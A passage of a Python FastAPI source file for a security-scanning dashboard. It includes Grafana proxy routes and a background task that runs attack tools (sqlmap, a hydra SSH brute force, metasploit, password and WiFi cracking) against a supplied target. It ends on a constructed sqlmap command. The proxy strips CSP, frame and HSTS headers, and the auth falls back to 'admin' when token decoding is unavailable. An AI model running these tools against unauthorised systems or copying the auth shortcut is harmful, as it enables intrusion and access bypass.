# ATTACK_TOTAL = get_or_create_metric(Counter, 'attack_total', 'Total attacks detected', ['type', 'severity'])
# # Add any others (Histograms, etc.) using the same pattern
# def get_metric(metric_type, name, documentation, labelnames=()):
#     # Check if the metric already exists to avoid the Duplicated Timeseries error
#     if name in REGISTRY._names_to_collectors:
#         return REGISTRY._names_to_collectors[name]
#     return metric_type(name, documentation, labelnames)

# # Re-define your metrics safely
# layer_status = get_metric(Gauge, 'layer_status', 'Neural layer status', ['layer'])
# import httpx
# from fastapi.responses import Response, HTMLResponse
# from urllib.parse import urlencode, urlparse, urlunparse
# import re

# GRAFANA_URL = "http://localhost:3000"

# @app.get("/grafana-proxy/{path:path}")
# async def grafana_proxy(path: str, request: Request):
#     """
#     Enhanced proxy for Grafana that properly handles assets and subpaths
#     """
#     try:
#         # Build the target URL
#         if path == "" or path == "/":
#             target_url = f"{GRAFANA_URL}/"
#         else:
#             target_url = f"{GRAFANA_URL}/{path}"
        
#         # Forward query parameters
#         if request.query_params:
#             target_url += "?" + urlencode(request.query_params)
        
#         # Create headers that mimic a browser
#         headers = {
#             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
#             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
#             "Accept-Language": "en-US,en;q=0.5",
#             "Accept-Encoding": "gzip, deflate",
#             "Connection": "keep-alive",
#             "Upgrade-Insecure-Requests": "1",
#         }
        
#         # Forward cookies
#         if request.cookies:
#             headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in request.cookies.items()])
        
#         # Forward authorization if present
#         if "authorization" in request.headers:
#             headers["Authorization"] = request.headers["authorization"]
        
#         async with httpx.AsyncClient(follow_redirects=True) as client:
#             response = await client.get(
#                 target_url,
#                 headers=headers,
#                 timeout=30.0
#             )
            
#             # Modify the response
#             modified_headers = dict(response.headers)
            
#             # Remove problematic headers
#             headers_to_remove = [
#                 "x-frame-options", 
#                 "content-security-policy",
#                 "content-security-policy-report-only"
#             ]
#             for header in headers_to_remove:
#                 if header in modified_headers:
#                     del modified_headers[header]
            
#             # Handle HTML content - rewrite asset paths
#             content = response.content
#             content_type = response.headers.get("content-type", "")
            
#             if "text/html" in content_type:
#                 # Decode content
#                 html_content = content.decode('utf-8')
                
#                 # Rewrite asset paths to go through proxy
#                 # Replace /public/ with /grafana-proxy/public/
#                 html_content = re.sub(
#                     r'(src|href)="/([^"]*)"',
#                     r'\1="/grafana-proxy/\2"',
#                     html_content
#                 )
                
#                 # Replace absolute URLs
#                 html_content = re.sub(
#                     r'(src|href)="' + re.escape(GRAFANA_URL) + r'/([^"]*)"',
#                     r'\1="/grafana-proxy/\2"',
#                     html_content
#                 )
                
#                 # Add base tag if not present
#                 if '<base' not in html_content:
#                     html_content = html_content.replace(
#                         '<head>',
#                         '<head><base href="/grafana-proxy/">'
#                     )
                
#                 content = html_content.encode('utf-8')
            
#             elif "application/javascript" in content_type or "text/css" in content_type:
#                 # For JS/CSS files, rewrite URLs
#                 try:
#                     text_content = content.decode('utf-8')
#                     # Rewrite URLs in CSS/JS
#                     text_content = re.sub(
#                         r'url\(["\']?/([^"\')]*)["\']?\)',
#                         r'url(/grafana-proxy/\1)',
#                         text_content
#                     )
#                     content = text_content.encode('utf-8')
#                 except:
#                     pass
            
#             # Return the response
#             return Response(
#                 content=content,
#                 status_code=response.status_code,
#                 headers=modified_headers,
#                 media_type=response.headers.get("content-type", "text/html")
#             )
            
#     except Exception as e:
#         logger.error(f"Grafana proxy error: {e}")
#         import traceback
#         traceback.print_exc()
        
#         return HTMLResponse(
#             content=f"""
#             <html>
#                 <head>
#                     <style>
#                         body {{ background: #02040a; color: #c9d1d9; font-family: 'Inter', sans-serif; padding: 40px; }}
#                         .container {{ max-width: 800px; margin: 0 auto; }}
#                         .error-box {{ 
#                             background: rgba(255, 49, 49, 0.1); 
#                             border: 1px solid #ff3131; 
#                             border-radius: 8px; 
#                             padding: 30px;
#                             text-align: center;
#                         }}
#                         h1 {{ color: #ff3131; }}
#                         button {{
#                             background: #00ffff;
#                             color: #000;
#                             border: none;
#                             padding: 12px 30px;
#                             border-radius: 6px;
#                             font-weight: bold;
#                             cursor: pointer;
#                             margin-top: 20px;
#                         }}
#                         button:hover {{ background: #00ccff; }}
#                     </style>
#                 </head>
#                 <body>
#                     <div class="container">
#                         <div class="error-box">
#                             <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: #ff3131; margin-bottom: 20px;"></i>
#                             <h1>Grafana Connection Error</h1>
#                             <p style="margin: 20px 0; color: #ff9999;">Could not connect to Grafana at {GRAFANA_URL}</p>
#                             <p style="font-size: 14px; background: #1a1f2e; padding: 15px; border-radius: 4px; text-align: left;">
#                                 <strong>Error details:</strong> {str(e)}
#                             </p>
#                             <div style="margin-top: 30px; text-align: left; background: #0f131f; padding: 20px; border-radius: 4px;">
#                                 <h3 style="color: #00ffff;">Troubleshooting steps:</h3>
#                                 <ol style="color: #b0b7c4; line-height: 1.8;">
#                                     <li>Make sure Grafana is running: <code>sudo systemctl status grafana-server</code></li>
#                                     <li>Check Grafana is accessible: <code>curl http://localhost:3000</code></li>
#                                     <li>Restart Grafana: <code>sudo systemctl restart grafana-server</code></li>
#                                     <li>Check Grafana logs: <code>sudo journalctl -u grafana-server -f</code></li>
#                                 </ol>
#                             </div>
#                             <button onclick="window.location.reload()">Retry Connection</button>
#                         </div>
#                     </div>
#                 </body>
#             </html>
#             """,
#             status_code=502
#         )

import httpx
from fastapi.responses import Response, HTMLResponse, JSONResponse
from urllib.parse import urlencode, urlparse
import re
import mimetypes

GRAFANA_URL = "http://localhost:3000"

from fastapi import Response  # already imported higher up, duplicate import harmless

@app.get("/installHook.js.map", include_in_schema=False)
async def install_hook_source_map():
    """
    React/DevTools (or similar extension) sometimes requests this map.
    return an empty javascript file / 204 so the log isn’t spammed.
    """
    # either return 204 or an empty file – both suppress the 404.
    return Response(content="", media_type="application/javascript", status_code=204)

@app.get("/grafana-proxy/{path:path}")
async def grafana_proxy(path: str, request: Request):
    """
    Enhanced proxy for Grafana that properly handles:
    - HTML pages with asset rewriting
    - Plugin assets (JS, CSS, JSON)
    - API requests
    - Static files
    """
    try:
        # Handle empty path
        if path == "" or path == "/":
            target_url = f"{GRAFANA_URL}/"
        else:
            target_url = f"{GRAFANA_URL}/{path}"
        
        # Forward query parameters
        if request.query_params:
            target_url += "?" + urlencode(request.query_params)
        
        # Create headers that mimic a browser
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": request.headers.get("accept", "*/*"),
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Referer": f"{GRAFANA_URL}/",
        }
        
        # Forward cookies
        if request.cookies:
            headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in request.cookies.items()])
        
        # Forward authorization if present
        if "authorization" in request.headers:
            headers["Authorization"] = request.headers["authorization"]
        
        async with httpx.AsyncClient(follow_redirects=True) as client:
            response = await client.get(
                target_url,
                headers=headers,
                timeout=30.0
            )
            
            # Determine content type
            content_type = response.headers.get("content-type", "")
            
            # Modify headers
            modified_headers = dict(response.headers)
            
            # Remove problematic headers
            headers_to_remove = [
                "x-frame-options", 
                "content-security-policy",
                "content-security-policy-report-only",
                "strict-transport-security"
            ]
            for header in headers_to_remove:
                if header in modified_headers:
                    del modified_headers[header]
            
            # Handle different content types
            content = response.content
            
            if "text/html" in content_type:
                # Decode HTML content
                html_content = content.decode('utf-8', errors='ignore')
                
                # Fix all asset paths
                # Replace /public/ with /grafana-proxy/public/
                html_content = re.sub(
                    r'(src|href)="/([^"]*)"',
                    r'\1="/grafana-proxy/\2"',
                    html_content
                )
                
                # Fix API calls
                html_content = re.sub(
                    r'api/',
                    '/grafana-proxy/api/',
                    html_content
                )
                
                # Fix plugin paths
                html_content = re.sub(
                    r'public/plugins/',
                    '/grafana-proxy/public/plugins/',
                    html_content
                )
                
                # Fix relative paths that start with ./
                html_content = re.sub(
                    r'(src|href)="\./([^"]*)"',
                    r'\1="/grafana-proxy/\2"',
                    html_content
                )
                
                # Add base tag if not present
                if '<base' not in html_content:
                    html_content = html_content.replace(
                        '<head>',
                        '<head><base href="/grafana-proxy/">'
                    )
                
                content = html_content.encode('utf-8')
                
            elif "application/javascript" in content_type or "text/javascript" in content_type:
                # For JS files, rewrite URLs
                try:
                    js_content = content.decode('utf-8', errors='ignore')
                    
                    # Rewrite API endpoints in JS
                    js_content = re.sub(
                        r'(["\'])api/',
                        r'\1/grafana-proxy/api/',
                        js_content
                    )
                    
                    # Rewrite plugin paths
                    js_content = re.sub(
                        r'(["\'])public/plugins/',
                        r'\1/grafana-proxy/public/plugins/',
                        js_content
                    )
                    
                    content = js_content.encode('utf-8')
                except:
                    pass
                    
            elif "application/json" in content_type:
                # For JSON responses, don't modify
                pass
                
            elif "text/css" in content_type:
                # For CSS files, rewrite URLs
                try:
                    css_content = content.decode('utf-8', errors='ignore')
                    
                    # Rewrite url() references
                    css_content = re.sub(
                        r'url\(["\']?/([^"\'\)]*)["\']?\)',
                        r'url(/grafana-proxy/\1)',
                        css_content
                    )
                    
                    content = css_content.encode('utf-8')
                except:
                    pass
            
            # Set proper content type
            if content_type:
                modified_headers["content-type"] = content_type
            
            return Response(
                content=content,
                status_code=response.status_code,
                headers=modified_headers,
                media_type=content_type
            )
            
    except httpx.ConnectError as e:
        logger.error(f"Grafana connection error: {e}")
        return HTMLResponse(
            content=f"""
            <html>
                <head>
                    <style>
                        body {{ background: #030614; color: #e0e0e0; font-family: 'Inter', sans-serif; padding: 40px; }}
                        .container {{ max-width: 800px; margin: 0 auto; }}
                        .error-box {{ 
                            background: rgba(255, 49, 49, 0.1); 
                            border: 1px solid #ff3131; 
                            border-radius: 12px; 
                            padding: 30px;
                            text-align: center;
                        }}
                        h1 {{ color: #ff3131; font-size: 24px; }}
                        .grafana-status {{ 
                            background: #1a1f2e; 
                            border-radius: 8px; 
                            padding: 20px; 
                            margin: 20px 0;
                            text-align: left;
                        }}
                        code {{ 
                            background: #0f131f; 
                            padding: 2px 6px; 
                            border-radius: 4px; 
                            color: #00ffff;
                        }}
                        button {{
                            background: linear-gradient(135deg, #00ffff, #ff00ff);
                            color: #030614;
                            border: none;
                            padding: 12px 30px;
                            border-radius: 8px;
                            font-weight: bold;
                            cursor: pointer;
                            margin-top: 20px;
                            transition: all 0.3s;
                        }}
                        button:hover {{
                            transform: scale(1.05);
                            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
                        }}
                        .steps {{
                            list-style: none;
                            padding: 0;
                        }}
                        .steps li {{
                            margin: 10px 0;
                            padding-left: 24px;
                            position: relative;
                        }}
                        .steps li:before {{
                            content: "→";
                            position: absolute;
                            left: 0;
                            color: #00ffff;
                        }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="error-box">
                            <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: #ff3131; margin-bottom: 20px;"></i>
                            <h1>Grafana Connection Error</h1>
                            <p style="margin: 20px 0; color: #ff9999;">Could not connect to Grafana at {GRAFANA_URL}</p>
                            
                            <div class="grafana-status">
                                <h3 style="color: #00ffff; margin-bottom: 15px;">🔧 Troubleshooting Steps:</h3>
                                <ul class="steps">
                                    <li><strong>Check if Grafana is running:</strong> <code>sudo systemctl status grafana-server</code></li>
                                    <li><strong>Start Grafana if not running:</strong> <code>sudo systemctl start grafana-server</code></li>
                                    <li><strong>Verify Grafana is accessible:</strong> <code>curl http://localhost:3000</code></li>
                                    <li><strong>Check Grafana logs:</strong> <code>sudo journalctl -u grafana-server -f</code></li>
                                    <li><strong>Restart Grafana:</strong> <code>sudo systemctl restart grafana-server</code></li>
                                </ul>
                            </div>
                            
                            <div class="grafana-status" style="margin-top: 20px;">
                                <h3 style="color: #00ffff; margin-bottom: 15px;">📊 Current Status:</h3>
                                <p><strong>Error:</strong> {str(e)}</p>
                                <p><strong>Target URL:</strong> {GRAFANA_URL}</p>
                                <p><strong>Request Path:</strong> /{path}</p>
                            </div>
                            
                            <button onclick="window.location.reload()">
                                <i class="fas fa-sync-alt mr-2"></i>Retry Connection
                            </button>
                            
                            <p style="margin-top: 30px; font-size: 12px; color: #666;">
                                <i class="fas fa-info-circle mr-1"></i>
                                Using fallback dashboard while Grafana is unavailable
                            </p>
                        </div>
                    </div>
                </body>
            </html>
            """,
            status_code=502
        )
    except Exception as e:
        logger.error(f"Grafana proxy error: {e}")
        import traceback
        traceback.print_exc()
        return HTMLResponse(
            content=f"""
            <html>
                <body style="background:#030614; color:#fff; padding:20px;">
                    <h1 style="color:#ff3131;">Proxy Error</h1>
                    <pre style="background:#1a1f2e; padding:15px; border-radius:8px;">{str(e)}</pre>
                </body>
            </html>
            """,
            status_code=500
        )
@app.api_route("/grafana-proxy/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"])
async def grafana_proxy(path: str, request: Request):
    """
    Enhanced proxy for Grafana that properly handles:
    - HTML pages with asset rewriting
    - Plugin assets (JS, CSS, JSON)
    - API requests
    - Static files
    - Content-Length header properly updated
    """
    try:
        # Handle empty path
        if path == "" or path == "/":
            target_url = f"{GRAFANA_URL}/"
        else:
            target_url = f"{GRAFANA_URL}/{path}"
        
        # Forward query parameters
        if request.query_params:
            target_url += "?" + urlencode(request.query_params)
        
        # Get request body for non-GET requests
        body = None
        if request.method in ["POST", "PUT", "PATCH"]:
            body = await request.body()
        
        # Create headers that mimic a browser
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": request.headers.get("accept", "*/*"),
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Referer": f"{GRAFANA_URL}/",
        }
        
        # Forward cookies
        if request.cookies:
            headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in request.cookies.items()])
        
        # Forward authorization if present
        if "authorization" in request.headers:
            headers["Authorization"] = request.headers["authorization"]
        
        # Forward content-type for POST requests
        if body and "content-type" in request.headers:
            headers["Content-Type"] = request.headers["content-type"]
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=30.0) as client:
            # Make the request
            response = await client.request(
                method=request.method,
                url=target_url,
                headers=headers,
                content=body,
                timeout=30.0
            )
            
            # Determine content type
            content_type = response.headers.get("content-type", "")
            content = response.content
            
            # Modify HTML content if needed
            if "text/html" in content_type and response.status_code == 200:
                try:
                    # Decode HTML content
                    html_content = content.decode('utf-8', errors='ignore')
                    
                    # Fix all asset paths
                    html_content = re.sub(
                        r'(src|href)="/([^"]*)"',
                        r'\1="/grafana-proxy/\2"',
                        html_content
                    )
                    
                    # Fix plugin paths specifically
                    html_content = re.sub(
                        r'(["\'])/public/plugins/',
                        r'\1/grafana-proxy/public/plugins/',
                        html_content
                    )
                    
                    # Fix API calls
                    html_content = re.sub(
                        r'(["\'])api/',
                        r'\1/grafana-proxy/api/',
                        html_content
                    )
                    
                    # Add base tag if not present
                    if '<base' not in html_content:
                        html_content = html_content.replace(
                            '<head>',
                            '<head><base href="/grafana-proxy/">'
                        )
                    
                    content = html_content.encode('utf-8')
                except Exception as e:
                    logger.error(f"Error modifying HTML: {e}")
            
            # Modify JavaScript content if needed
            elif ("application/javascript" in content_type or "text/javascript" in content_type) and response.status_code == 200:
                try:
                    js_content = content.decode('utf-8', errors='ignore')
                    
                    # Rewrite API endpoints in JS
                    js_content = re.sub(
                        r'(["\'])api/',
                        r'\1/grafana-proxy/api/',
                        js_content
                    )
                    
                    # Rewrite plugin paths
                    js_content = re.sub(
                        r'(["\'])/public/plugins/',
                        r'\1/grafana-proxy/public/plugins/',
                        js_content
                    )
                    
                    content = js_content.encode('utf-8')
                except:
                    pass
            
            # Modify CSS content if needed
            elif "text/css" in content_type and response.status_code == 200:
                try:
                    css_content = content.decode('utf-8', errors='ignore')
                    
                    # Rewrite url() references
                    css_content = re.sub(
                        r'url\(["\']?/([^"\'\)]*)["\']?\)',
                        r'url(/grafana-proxy/\1)',
                        css_content
                    )
                    
                    content = css_content.encode('utf-8')
                except:
                    pass
            
            # Prepare response headers (remove problematic ones)
            modified_headers = {}
            excluded_headers = [
                "content-encoding",
                "content-length",
                "transfer-encoding",
                "connection",
                "x-frame-options", 
                "content-security-policy",
                "content-security-policy-report-only",
                "strict-transport-security"
            ]
            
            for key, value in response.headers.items():
                if key.lower() not in excluded_headers:
                    modified_headers[key] = value
            
            # Set proper content type
            if content_type:
                modified_headers["content-type"] = content_type
            
            # Return the response (FastAPI will set correct Content-Length)
            return Response(
                content=content,
                status_code=response.status_code,
                headers=modified_headers,
                media_type=content_type
            )
            
    except httpx.ConnectError as e:
        logger.error(f"Grafana connection error: {e}")
        return HTMLResponse(
            content=f"""
            <html>
                <head><title>Grafana Connection Error</title></head>
                <body style="background:#030614; color:#fff; font-family:sans-serif; padding:40px;">
                    <h1 style="color:#ff3131;">Grafana Connection Error</h1>
                    <p>Could not connect to Grafana at {GRAFANA_URL}</p>
                    <p>Error: {str(e)}</p>
                    <button onclick="window.location.reload()" 
                            style="background:#00ffff; color:#000; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">
                        Retry
                    </button>
                </body>
            </html>
            """,
            status_code=502
        )
    except Exception as e:
        logger.error(f"Grafana proxy error: {e}")
        import traceback
        traceback.print_exc()
        return HTMLResponse(
            content=f"<html><body><h1>Proxy Error</h1><pre>{str(e)}</pre></body></html>",
            status_code=500
        )
from fastapi.middleware.gzip import GZipMiddleware

# Add GZip middleware to handle compressed responses
app.add_middleware(GZipMiddleware, minimum_size=1000)


@app.get("/grafana-proxy-simple/{path:path}")
async def grafana_proxy_simple(path: str, request: Request):
    """Simple proxy without content modification"""
    try:
        target_url = f"{GRAFANA_URL}/{path}"
        if request.query_params:
            target_url += "?" + urlencode(request.query_params)
        
        async with httpx.AsyncClient() as client:
            response = await client.get(target_url, follow_redirects=True)
            
            # Return without modification
            return Response(
                content=response.content,
                status_code=response.status_code,
                headers={k: v for k, v in response.headers.items() 
                        if k.lower() not in ["content-encoding", "content-length", "transfer-encoding"]},
                media_type=response.headers.get("content-type")
            )
    except Exception as e:
        return HTMLResponse(f"<h1>Error</h1><pre>{e}</pre>", status_code=500)
    



@app.post("/analyze")
async def start_analysis(request: Request, db: Session = Depends(get_db)):
    data = await request.json()
    target_url = data.get("url")
    
    # This triggers the SentinelBrain logic
    analysis_id = str(uuid.uuid4())
    # ... your processing logic ...
    
    return {"status": "success", "analysis_id": analysis_id, "target": target_url}
# @app.get("/grafana-proxy/{path:path}")
# async def grafana_proxy(path: str, request: Request):
#     """
#     Enhanced proxy for Grafana that properly handles:
#     - HTML pages with asset rewriting
#     - Plugin assets (JS, CSS, JSON)
#     - API requests
#     - Static files
#     """
#     try:
#         # Handle empty path
#         if path == "" or path == "/":
#             target_url = f"{GRAFANA_URL}/"
#         else:
#             target_url = f"{GRAFANA_URL}/{path}"
        
#         # Forward query parameters
#         if request.query_params:
#             target_url += "?" + urlencode(request.query_params)
        
#         # Create headers that mimic a browser
#         headers = {
#             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
#             "Accept": request.headers.get("accept", "*/*"),
#             "Accept-Language": "en-US,en;q=0.5",
#             "Accept-Encoding": "gzip, deflate",
#             "Connection": "keep-alive",
#             "Referer": f"{GRAFANA_URL}/",
#         }
        
#         # Forward cookies
#         if request.cookies:
#             headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in request.cookies.items()])
        
#         # Forward authorization if present
#         if "authorization" in request.headers:
#             headers["Authorization"] = request.headers["authorization"]
        
#         async with httpx.AsyncClient(follow_redirects=True) as client:
#             response = await client.get(
#                 target_url,
#                 headers=headers,
#                 timeout=30.0
#             )
            
#             # Determine content type
#             content_type = response.headers.get("content-type", "")
            
#             # Modify headers
#             modified_headers = dict(response.headers)
            
#             # Remove problematic headers
#             headers_to_remove = [
#                 "x-frame-options", 
#                 "content-security-policy",
#                 "content-security-policy-report-only",
#                 "strict-transport-security"
#             ]
#             for header in headers_to_remove:
#                 if header in modified_headers:
#                     del modified_headers[header]
            
#             # Handle different content types
#             content = response.content
            
#             if "text/html" in content_type:
#                 # Decode HTML content
#                 html_content = content.decode('utf-8', errors='ignore')
                
#                 # Fix all asset paths - CRITICAL FIX FOR PLUGINS
#                 html_content = re.sub(
#                     r'(src|href)="/([^"]*)"',
#                     r'\1="/grafana-proxy/\2"',
#                     html_content
#                 )
                
#                 # Fix plugin paths specifically
#                 html_content = re.sub(
#                     r'(["\'])/public/plugins/',
#                     r'\1/grafana-proxy/public/plugins/',
#                     html_content
#                 )
                
#                 # Fix API calls
#                 html_content = re.sub(
#                     r'(["\'])api/',
#                     r'\1/grafana-proxy/api/',
#                     html_content
#                 )
                
#                 # Add base tag if not present
#                 if '<base' not in html_content:
#                     html_content = html_content.replace(
#                         '<head>',
#                         '<head><base href="/grafana-proxy/">'
#                     )
                
#                 content = html_content.encode('utf-8')
                
#             elif "application/javascript" in content_type or "text/javascript" in content_type:
#                 # For JS files, rewrite URLs
#                 try:
#                     js_content = content.decode('utf-8', errors='ignore')
                    
#                     # Rewrite API endpoints in JS
#                     js_content = re.sub(
#                         r'(["\'])api/',
#                         r'\1/grafana-proxy/api/',
#                         js_content
#                     )
                    
#                     # Rewrite plugin paths
#                     js_content = re.sub(
#                         r'(["\'])/public/plugins/',
#                         r'\1/grafana-proxy/public/plugins/',
#                         js_content
#                     )
                    
#                     content = js_content.encode('utf-8')
#                 except:
#                     pass
                    
#             elif "text/css" in content_type:
#                 # For CSS files, rewrite URLs
#                 try:
#                     css_content = content.decode('utf-8', errors='ignore')
                    
#                     # Rewrite url() references
#                     css_content = re.sub(
#                         r'url\(["\']?/([^"\'\)]*)["\']?\)',
#                         r'url(/grafana-proxy/\1)',
#                         css_content
#                     )
                    
#                     content = css_content.encode('utf-8')
#                 except:
#                     pass
            
#             # Set proper content type
#             if content_type:
#                 modified_headers["content-type"] = content_type
            
#             return Response(
#                 content=content,
#                 status_code=response.status_code,
#                 headers=modified_headers,
#                 media_type=content_type
#             )
            
#     except Exception as e:
#         logger.error(f"Grafana proxy error: {e}")
#         return HTMLResponse(
#             content=f"<html><body><h1>Proxy Error</h1><pre>{str(e)}</pre></body></html>",
#             status_code=500
#         )
@app.get("/grafana-fallback", response_class=HTMLResponse, include_in_schema=False)
async def grafana_fallback(request: Request):
    """Fallback metrics page when Grafana is unavailable"""
    return templates.TemplateResponse("grafana_fallback.html", {"request": request})
# @app.get("/grafana", response_class=HTMLResponse, include_in_schema=False)
# async def grafana_full_page(request: Request, db: Session = Depends(get_db)):
#     """Full page Grafana dashboard"""
#     token = request.cookies.get("access_token")
#     if not token:
#         return RedirectResponse(url="/login")
    
#     try:
#         if token.startswith("Bearer "):
#             token = token.replace("Bearer ", "")
        
#         if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
#             payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
#             username = payload.get("sub")
#         else:
#             username = "admin"
        
#         user = db.query(User).filter(User.username == username).first()
#         if not user:
#             return RedirectResponse(url="/login")
            
#     except Exception as e:
#         print(f"Auth error: {e}")
#         return RedirectResponse(url="/login")
    
#     return templates.TemplateResponse("grafana_dashboard.html", {
#         "request": request,
#         "user": user
#     })
    
@fastapi_app.get("/grafana")
async def proxy_grafana():
    """Redirects to the Grafana dashboard"""
    # This assumes Grafana is running on the same host at port 3000
    return RedirectResponse(url="http://localhost:3000")  
@app.get("/metrics-dashboard", response_class=HTMLResponse, include_in_schema=False)
async def simple_metrics_dashboard(request: Request, db: Session = Depends(get_db)):
    """Simple metrics dashboard without Grafana"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
            
    except Exception as e:
        print(f"Auth error: {e}")
        return RedirectResponse(url="/login")
    
    return templates.TemplateResponse("metrics_dashboard.html", {
        "request": request,
        "user": user
    })
    
    
# Add this near the top with other global variables
scan_results = {}

@app.get("/api/scan/status/{scan_id}")
async def get_scan_status(scan_id: str):
    if scan_id not in scan_results:
        raise HTTPException(status_code=404, detail="Scan ID not found")
    return scan_results[scan_id]  


async def run_neural_attack_analysis(target, full_url, scan_id):
    """Background task: Run all tools sequentially, then emit AI suggestion based on vulnerabilities"""
    # 1. Initialize global state
    scan_results[scan_id] = {"status": "processing", "progress": 0, "results": {}}
    
    try:
        # Track all vulnerabilities found across tools
        all_vulnerabilities = []
        progress_step = 100 // 12  # 12 tools total, ~8% each
        
        # Step 1: Nmap Scan
        scan_results[scan_id]["progress"] = progress_step
        nmap_results = PenetrationTools.nmap_scan(target)
        if sio:
            await sio.emit('nmap_update', nmap_results)
        scan_results[scan_id]["results"]["nmap"] = nmap_results
        if nmap_results.get('vulnerabilities'):
            all_vulnerabilities.extend(nmap_results['vulnerabilities'])
        
        # Step 2: Nikto Scan
        scan_results[scan_id]["progress"] = progress_step * 2
        nikto_results = PenetrationTools.nikto_scan(target)
        if sio:
            await sio.emit('nikto_update', nikto_results)
        scan_results[scan_id]["results"]["nikto"] = nikto_results
        if nikto_results.get('vulnerabilities'):
            all_vulnerabilities.extend(nikto_results['vulnerabilities'])
        
        # Step 3: SQLMap Scan
        scan_results[scan_id]["progress"] = progress_step * 3
        sqlmap_results = PenetrationTools.sqlmap_scan(target)
        if sio:
            await sio.emit('sqlmap_update', sqlmap_results)
        scan_results[scan_id]["results"]["sqlmap"] = sqlmap_results
        if sqlmap_results.get('vulnerabilities'):
            all_vulnerabilities.extend(sqlmap_results['vulnerabilities'])
        
        # Step 4: WPScan (WordPress)
        scan_results[scan_id]["progress"] = progress_step * 4
        wpscan_results = PenetrationTools.wpscan(target)
        if sio:
            await sio.emit('wpscan_update', wpscan_results)
        scan_results[scan_id]["results"]["wpscan"] = wpscan_results
        if wpscan_results.get('vulnerabilities'):
            all_vulnerabilities.extend(wpscan_results['vulnerabilities'])
        
        # Step 5: Gobuster (Directory enumeration)
        scan_results[scan_id]["progress"] = progress_step * 5
        gobuster_results = PenetrationTools.gobuster_dir(target)
        if sio:
            await sio.emit('gobuster_update', gobuster_results)
        scan_results[scan_id]["results"]["gobuster"] = gobuster_results
        
        # Step 6: Burp Suite Scan
        scan_results[scan_id]["progress"] = progress_step * 6
        burp_results = PenetrationTools.burp_scan(target)
        if sio:
            await sio.emit('burp_update', burp_results)
        scan_results[scan_id]["results"]["burp"] = burp_results
        if burp_results.get('issues'):
            all_vulnerabilities.extend(burp_results['issues'])
        
        # Step 7: Hydra (SSH brute force simulation)
        scan_results[scan_id]["progress"] = progress_step * 7
        hydra_results = PenetrationTools.hydra_attack(target, 'ssh')
        if sio:
            await sio.emit('hydra_update', hydra_results)
        scan_results[scan_id]["results"]["hydra"] = hydra_results
        
        # Step 8: Metasploit (Exploit simulation)
        scan_results[scan_id]["progress"] = progress_step * 8
        metasploit_results = PenetrationTools.metasploit_exploit(target, 'apache')
        if sio:
            await sio.emit('metasploit_update', metasploit_results)
        scan_results[scan_id]["results"]["metasploit"] = metasploit_results
        
        # Step 9: John the Ripper (Password cracking simulation)
        scan_results[scan_id]["progress"] = progress_step * 9
        john_results = PenetrationTools.john_the_ripper('hashes.txt')
        if sio:
            await sio.emit('john_update', john_results)
        scan_results[scan_id]["results"]["john"] = john_results
        
        # Step 10: Aircrack-ng (WiFi simulation)
        scan_results[scan_id]["progress"] = progress_step * 10
        aircrack_results = PenetrationTools.aircrack_ng('capture.cap')
        if sio:
            await sio.emit('aircrack_update', aircrack_results)
        scan_results[scan_id]["results"]["aircrack"] = aircrack_results
        
        # Step 11: BloodHound (AD mapping)
        scan_results[scan_id]["progress"] = progress_step * 11
        bloodhound_results = PenetrationTools.bloodhound_ad_map(f"{target}.local")
        if sio:
            await sio.emit('bloodhound_update', bloodhound_results)
        scan_results[scan_id]["results"]["bloodhound"] = bloodhound_results
        
        # Step 12: Wireshark (Packet analysis)
        scan_results[scan_id]["progress"] = progress_step * 12
        wireshark_results = PenetrationTools.wireshark_analyze()
        if sio:
            await sio.emit('wireshark_update', wireshark_results)
        scan_results[scan_id]["results"]["wireshark"] = wireshark_results
        
        # Step 13: Final AI Synthesis based on actual vulnerabilities
        scan_results[scan_id]["progress"] = 95
        
        # Remove duplicates and prioritize vulnerabilities
        unique_vulns = []
        seen = set()
        for vuln in all_vulnerabilities:
            if isinstance(vuln, dict):
                vuln_key = f"{vuln.get('name', '')}_{vuln.get('severity', '')}"
                if vuln_key not in seen:
                    seen.add(vuln_key)
                    unique_vulns.append(vuln)
        
        # Sort by severity (CRITICAL first)
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        unique_vulns.sort(key=lambda x: severity_order.get(x.get('severity', 'MEDIUM'), 4))
        
        # Generate AI suggestions for top 3 vulnerabilities
        suggestions = []
        for i, vuln in enumerate(unique_vulns[:3]):
            vuln_name = vuln.get('name', '').lower() if isinstance(vuln, dict) else str(vuln).lower()
            
            # Determine appropriate tool based on vulnerability type
            if 'sql' in vuln_name:
                tool = "sqlmap"
                payload = f"sqlmap -u {target}/products.php?id=1 --batch --dbs"
